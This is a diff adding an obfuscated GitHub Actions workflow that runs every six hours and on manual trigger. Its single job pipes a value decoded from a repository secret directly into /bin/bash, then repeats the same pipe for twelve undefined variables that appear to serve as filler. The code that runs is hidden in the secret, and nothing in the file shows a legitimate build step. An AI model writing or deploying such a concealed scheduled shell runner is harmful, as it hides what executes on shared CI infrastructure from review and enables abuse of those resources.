@@ -1,0 +1,29 @@
+name: lizhengxin8719
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lizhengxin8719
+        env:
+          r123: ${{ secrets.r123 }}
+        run: |
+          echo $r123 | jq -r .gqmw6966 | /bin/bash
+          echo $yggq4320 | jq -r .a09426 | /bin/bash
+          echo $lf38980 | jq -r .l3 | /bin/bash
+          echo $gf0 | jq -r .gg88676 | /bin/bash
+          echo $gvq867 | jq -r .bdlmr75 | /bin/bash
+          echo $het3 | jq -r .jwk8 | /bin/bash
+          echo $mb3 | jq -r .je904 | /bin/bash
+          echo $urpq158 | jq -r .rrnjm84 | /bin/bash
+          echo $x58 | jq -r .gpo32 | /bin/bash
+          echo $aw2 | jq -r .xhh1 | /bin/bash
+          echo $sia982 | jq -r .sfaah92963 | /bin/bash
+          echo $hwhve389 | jq -r .m25863 | /bin/bash
+          echo $vll41744 | jq -r .pjpfh2 | /bin/bash
+
